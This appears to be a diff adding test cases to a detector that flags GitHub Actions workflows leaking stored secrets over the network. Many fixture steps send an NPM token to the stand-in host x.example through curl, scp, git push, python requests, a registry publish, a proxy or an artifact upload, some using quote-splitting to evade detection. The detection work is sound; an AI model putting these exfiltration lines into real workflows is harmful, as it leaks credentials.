@@ -52,7 +52,20 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: a stored secret and egress in one work
     ["scp to a remote host", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: scp out.txt user@x.example:/tmp/"]],
     ["python requests", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', `        run: python3 -c "import requests; requests.post('https://x.example', data='x')"`]],
     ["git push to a remote that is not GitHub", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: git push https://x.example/r.git HEAD"]],
+    ["git push to a host:path remote", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: git push deploy@x.example:r.git HEAD"]],
+    ["git push to a git:// remote", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: git push git://x.example/r.git HEAD"]],
     ["a tool name split by quoting", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: c''url -d \"$T\" https://x.example"]],
+    ["a curl after an escaped quote and a hash", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', '        run: echo "a\\" #"; curl -d "$T" https://x.example']],
+    ["a secret in a URL's credentials", ["      - run: git clone https://x:${{ secrets.K }}@x.example/r.git"]],
+    ["a publish to another registry", ['      - env: { NODE_AUTH_TOKEN: "${{ secrets.NPM_TOKEN }}" }', "        run: npm publish --registry https://x.example/npm/"]],
+    ["an upload-artifact merge", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', '        run: echo "$T" > k.txt', "      - uses: actions/upload-artifact/merge@v4"]],
+    ["a proxy written onto curl's option", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', '        run: curl -xx.example:3128 -d "$T" http://localhost/']],
+    ["a proxy variable in front of a loopback call", ["      - env:", '          T: "${{ secrets.NPM_TOKEN }}"', "          HTTPS_PROXY: http://x.example:3128", '        run: curl -d "$T" http://localhost/']],
+    ["a one-line flow-map step", [`      - { name: x, run: 'curl -d "\${{ secrets.NPM_TOKEN }}" https://x.example' }`]],
+    ["a quoted flow-map run handing a URL to a script", ['      - { env: { T: "${{ secrets.NPM_TOKEN }}" }, run: \'python send.py https://x.example\' }']],
+    ["a one-line flow-map upload", ['      - run: echo "${{ secrets.NPM_TOKEN }}" > k.txt', "      - { uses: actions/upload-artifact@v4, with: { path: k.txt } }"]],
+    ["a registry option set with =", ['      - env: { NODE_AUTH_TOKEN: "${{ secrets.NPM_TOKEN }}" }', "        run: npm publish --registry=https://x.example/npm/"]],
+    ["a URL handed to a script", ['      - run: python send.py https://x.example "${{ secrets.NPM_TOKEN }}"']],
   ] as Array<[string, string[], string?]>)("reports %s", (_label, steps, extra) => {
     workflow([...HEAD, ...steps, ...(extra ? [extra] : [])]);
     expect(files()).toEqual([".github/workflows/ci.yml"]);
@@ -87,6 +100,11 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: what is not a stored secret or not egr
     ["a URL outside executed text", ["      - uses: some-org/deploy@0123456789abcdef0123456789abcdef01234567", "        with:", "          url: https://x.example", "          token: ${{ secrets.NPM_TOKEN }}"]],
     ["ssh-keygen and ssh to loopback", ['      - env: { KEY: "${{ secrets.SSH_PRIVATE_KEY }}" }', "        run: ssh-keygen -R x.example && ssh -p 2222 git@127.0.0.1 true"]],
     ["gh api", ['      - env: { GH_TOKEN: "${{ secrets.RELEASE_PAT }}" }', "        run: gh api repos/o/r/releases"]],
+    ["a secret in the credentials of a GitHub URL", ["      - run: git push https://x-access-token:${{ secrets.RELEASE_PAT }}@github.com/o/r.git HEAD"]],
+    ["npm publish to the public registry", ['      - env: { NODE_AUTH_TOKEN: "${{ secrets.NPM_TOKEN }}" }', "        run: npm publish --registry https://registry.npmjs.org/"]],
+    ["URLs of GitHub and a public registry handed to a script", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: node notes.js https://github.com/o/r/releases https://registry.npmjs.org/p"]],
+    ["a proxy variable pointing at loopback", ["      - env:", '          T: "${{ secrets.NPM_TOKEN }}"', "          HTTPS_PROXY: http://127.0.0.1:3128", "        run: curl http://localhost/health"]],
+    ["a flow-map step without egress", ['      - { name: x, run: \'echo "${{ secrets.NPM_TOKEN }}" | wc -c\' }']],
   ])("does not report %s", (_label, steps) => {
     workflow([...HEAD, ...steps]);
     expect(files()).toEqual([]);
@@ -122,6 +140,12 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: linear on 5 MiB input", () => {
     ["quoted command names", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: ${"c''u\"r\"l ".repeat(Math.ceil(FIVE_MIB / 10))}`]],
     ["git push words", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: git push ${"a@b.c:d ".repeat(Math.ceil(FIVE_MIB / 8))}`]],
     ["presence tests", () => [...HEAD, `      - run: echo "${"${{ secrets.X != '' }} ".repeat(Math.ceil(FIVE_MIB / 26))}"`]],
+    ["a line of spaces", () => [...HEAD, "      - run: echo ok", " ".repeat(FIVE_MIB)]],
+    ["a line of spaces before a dash", () => [...HEAD, "      - run: echo ok", " ".repeat(FIVE_MIB) + "-"]],
+    ["URLs with long credentials", () => [...HEAD, `      - run: ${"https://aa:bb@x.example ".repeat(Math.ceil(FIVE_MIB / 26))}`]],
+    ["loopback URL words", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: node a.js ${"http://localhost/ ".repeat(Math.ceil(FIVE_MIB / 17))}`]],
+    ["proxy variables", () => [...HEAD, `      - env: { T: "\${{ secrets.X }}", ${"http_proxy=localhost, ".repeat(Math.ceil(FIVE_MIB / 23))} }`, "        run: curl localhost"]],
+    ["a long flow-map step", () => [...HEAD, `      - { run: '${"{a, ".repeat(Math.ceil(FIVE_MIB / 4))}' }`, '      - env: { T: "${{ secrets.X }}" }']],
   ] as Array<[string, () => string[]]>)("%s", { timeout: performanceBudget(60_000) }, (_label, build) => {
     expect(timed(build())).toBeLessThan(performanceBudget(15_000));
   });
